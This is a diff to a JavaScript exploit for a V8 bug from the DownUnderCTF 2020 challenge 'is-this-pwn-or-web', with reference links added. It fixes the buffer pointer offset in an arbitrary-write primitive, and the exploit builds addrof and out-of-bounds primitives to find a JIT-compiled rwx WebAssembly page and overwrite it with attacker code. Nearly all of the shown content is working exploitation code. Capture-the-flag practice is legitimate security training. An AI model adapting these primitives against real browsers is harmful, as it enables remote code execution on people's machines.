@@ -17,6 +17,13 @@
  * Create a WASM module and load some dummy code. The module gets JITed, and the page the
  * code is on is left as rwx. Use addrof and OOB read to pull the address of that page
  * out of the WasmInstanceObject, and then arbitrary write to replace with our own code
+ * 
+ * Chal files: https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/is-this-pwn-or-web
+ * 
+ * Useful links:
+ * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
+ * https://www.elttam.com/blog/simple-bugs-with-complex-exploits/#content
+ * https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#javascript-exploitation-primitives
  */
 
 //=========================================================================
@@ -40,7 +47,7 @@ function itof(val) { // typeof(val) = BigInt
 
 // Offsets from oob to other interesting places
 const OBJ_OFFSET = 4;
-const VICTIM_BUF_LEN_OFFSET = 13;
+const VICTIM_BUF_PTR_OFFSET = 14;
 
 function addrof(target) {
     victim.obj = target;
@@ -54,17 +61,17 @@ function write(addr, data) {
 
     // Write lower half of new address
     const addr_low = addr & 0xffffffffn; 
-    const curr_addr_low = ftoi(oob[VICTIM_BUF_LEN_OFFSET + 1]);
+    const curr_addr_low = ftoi(oob[VICTIM_BUF_PTR_OFFSET]);
     const new_addr_low = (addr_low << 32n) | (curr_addr_low & 0xffffffffn);
-    oob[VICTIM_BUF_LEN_OFFSET + 1] = itof(new_addr_low);
+    oob[VICTIM_BUF_PTR_OFFSET] = itof(new_addr_low);
 
     // Write upper bytes of new address
     const addr_high = addr & 0xffffffff00000000n;
-    const curr_addr_high = ftoi(oob[VICTIM_BUF_LEN_OFFSET + 2]);
+    const curr_addr_high = ftoi(oob[VICTIM_BUF_PTR_OFFSET + 1]);
     const new_addr_high = (addr_high >> 32n) | (curr_addr_high & 0xffffffff00000000n);
-    oob[VICTIM_BUF_LEN_OFFSET + 2] = itof(new_addr_high);
+    oob[VICTIM_BUF_PTR_OFFSET + 1] = itof(new_addr_high);
 
-    // Now that the addres has been correctly set, write data at that address
+    // Now that the address has been correctly set, write data at that address
     let u8_buf = new Uint8Array(victim_buf);
     for (let i = 0; i < data.length; i++) {
         u8_buf[i] = data[i];
@@ -89,7 +96,7 @@ shell = wasm_instance.exports.shell;
 wasm_addr = addrof(wasm_instance);
 oob_addr = addrof(oob) - 0x10n;
 
-// code page pointer is 12 indicies away from base of WasmInstanceObject
+// code page pointer is 12 indices away from base of WasmInstanceObject
 rwx_idx = Number((wasm_addr - oob_addr) / 8n) + 12;
 
 // We don't line up exactly, so we need to pull the upper and lower half separately and 
